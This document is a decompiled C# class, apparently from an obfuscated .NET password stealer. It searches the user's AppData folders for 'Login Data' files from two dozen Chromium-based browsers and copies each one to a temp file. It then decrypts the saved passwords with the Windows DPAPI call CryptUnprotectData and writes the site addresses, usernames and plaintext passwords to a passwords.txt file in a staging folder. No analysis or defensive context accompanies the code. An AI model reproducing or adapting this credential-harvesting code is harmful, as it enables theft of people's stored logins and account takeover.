using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using who;

// Token: 0x0200003F RID: 63
internal class Class26
{
	// Token: 0x06000203 RID: 515 RVA: 0x00010138 File Offset: 0x0000E338
	public static void smethod_0()
	{
		string[] array = new string[]
		{
			"Chrome",
			"Yandex",
			"Orbitum",
			"Opera",
			"Amigo",
			"Torch",
			"Comodo",
			"CentBrowser",
			"Go!",
			"uCozMedia",
			"Rockmelt",
			"Sleipnir",
			"SRWare Iron",
			"Vivaldi",
			"Sputnik",
			"Maxthon",
			"AcWebBrowser",
			"Epic Browser",
			"MapleStudio",
			"BlackHawk",
			"Flock",
			"CoolNovo",
			"Baidu Spark",
			"Titan Browser"
		};
		try
		{
			Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			};
			List<string> list3 = new List<string>();
			foreach (string path in list2)
			{
				try
				{
					list3.AddRange(Directory.GetDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string path2 in list3)
			{
				try
				{
					list.AddRange(Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories));
					string[] files = Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories);
					foreach (string text in files)
					{
						try
						{
							if (File.Exists(text))
							{
								string string_ = "Unknown (" + text + ")";
								foreach (string text2 in array)
								{
									if (text.Contains(text2))
									{
										string_ = text2;
									}
								}
								try
								{
									string text3 = Path.GetTempPath() + "/test.fv";
									if (File.Exists(text3))
									{
										File.Delete(text3);
									}
									File.Copy(text, text3, true);
									Class12 @class = new Class12(text3);
									if (!@class.method_4("logins"))
									{
										break;
									}
									int num = 0;
									for (;;)
									{
										try
										{
											if (num >= @class.method_1())
											{
												break;
											}
											try
											{
												string text4 = string.Empty;
												try
												{
													text4 = Encoding.UTF8.GetString(Class26.smethod_1(Encoding.Default.GetBytes(@class.method_0(num, 5)), null));
												}
												catch (Exception)
												{
												}
												if (text4 != "")
												{
													Class27 class2 = new Class27();
													class2.method_1(@class.method_0(num, 1).Replace("https://", "").Replace("http://", "").Replace("www.", ""));
													class2.method_3(@class.method_0(num, 3));
													class2.method_5(text4);
													class2.method_7(string_);
													Class27 arg = class2;
													Class26.string_0 += Convert.ToString(Environment.NewLine + arg);
													Class26.int_0++;
												}
											}
											catch
											{
											}
											num++;
										}
										catch
										{
										}
									}
									File.Delete(text3);
								}
								catch
								{
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
			File.WriteAllText(Dirs.WorkDir + "\\passwords.txt", (Class26.string_0 != null) ? ("Shut Up and Work " + Environment.NewLine + Class26.string_0 + "\n") : "", Encoding.Default);
		}
		catch
		{
		}
	}

	// Token: 0x06000204 RID: 516 RVA: 0x00010604 File Offset: 0x0000E804
	public static byte[] smethod_1(byte[] byte_0, byte[] byte_1 = null)
	{
		Class26.Struct8 @struct = default(Class26.Struct8);
		Class26.Struct8 struct2 = default(Class26.Struct8);
		Class26.Struct8 struct3 = default(Class26.Struct8);
		Class26.Struct9 struct4 = new Class26.Struct9
		{
			int_0 = Marshal.SizeOf(typeof(Class26.Struct9)),
			int_1 = 0,
			intptr_0 = IntPtr.Zero,
			string_0 = null
		};
		string empty = string.Empty;
		try
		{
			try
			{
				if (byte_0 == null)
				{
					byte_0 = new byte[0];
				}
				struct2.intptr_0 = Marshal.AllocHGlobal(byte_0.Length);
				struct2.int_0 = byte_0.Length;
				Marshal.Copy(byte_0, 0, struct2.intptr_0, byte_0.Length);
			}
			catch
			{
			}
			try
			{
				if (byte_1 == null)
				{
					byte_1 = new byte[0];
				}
				struct3.intptr_0 = Marshal.AllocHGlobal(byte_1.Length);
				struct3.int_0 = byte_1.Length;
				Marshal.Copy(byte_1, 0, struct3.intptr_0, byte_1.Length);
			}
			catch
			{
			}
			Class26.CryptUnprotectData(ref struct2, ref empty, ref struct3, IntPtr.Zero, ref struct4, 1, ref @struct);
			byte[] array = new byte[@struct.int_0];
			Marshal.Copy(@struct.intptr_0, array, 0, @struct.int_0);
			return array;
		}
		catch
		{
		}
		finally
		{
			if (@struct.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(@struct.intptr_0);
			}
			if (struct2.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(struct2.intptr_0);
			}
			if (struct3.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(struct3.intptr_0);
			}
		}
		return new byte[0];
	}

	// Token: 0x06000205 RID: 517
	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Class26.Struct8 struct8_0, ref string string_1, ref Class26.Struct8 struct8_1, IntPtr intptr_0, ref Class26.Struct9 struct9_0, int int_1, ref Class26.Struct8 struct8_2);

	// Token: 0x06000206 RID: 518 RVA: 0x0000276F File Offset: 0x0000096F
	public Class26()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x06000207 RID: 519 RVA: 0x00002E0C File Offset: 0x0000100C
	// Note: this type is marked as 'beforefieldinit'.
	static Class26()
	{
		Class34.A1SfXVPz7w9eh();
		Class26.int_0 = 0;
		Class26.list_0 = new List<Class27>();
	}

	// Token: 0x040000D8 RID: 216
	public static string string_0;

	// Token: 0x040000D9 RID: 217
	public static int int_0;

	// Token: 0x040000DA RID: 218
	public static List<Class27> list_0;

	// Token: 0x02000040 RID: 64
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct8
	{
		// Token: 0x040000DB RID: 219
		public int int_0;

		// Token: 0x040000DC RID: 220
		public IntPtr intptr_0;
	}

	// Token: 0x02000041 RID: 65
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct9
	{
		// Token: 0x040000DD RID: 221
		public int int_0;

		// Token: 0x040000DE RID: 222
		public int int_1;

		// Token: 0x040000DF RID: 223
		public IntPtr intptr_0;

		// Token: 0x040000E0 RID: 224
		public string string_0;
	}
}
